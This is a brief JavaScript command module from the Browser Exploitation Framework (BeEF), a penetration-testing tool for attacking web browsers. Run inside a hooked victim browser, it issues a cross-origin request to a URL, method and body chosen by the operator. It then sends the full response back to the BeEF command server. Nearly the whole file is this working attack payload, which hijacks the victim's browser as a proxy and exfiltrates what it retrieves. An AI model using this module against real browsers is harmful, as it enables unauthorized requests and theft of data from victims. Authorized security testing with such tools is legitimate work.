//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var method = "<%= @method %>";
	var url    = "<%= @url %>";
	var data   = "<%= @data %>";

	beef.net.cors.request(method, url, data, function(response) { beef.net.send("<%= @command_url %>", <%= @command_id %>, "response="+JSON.stringify(response)); });

});

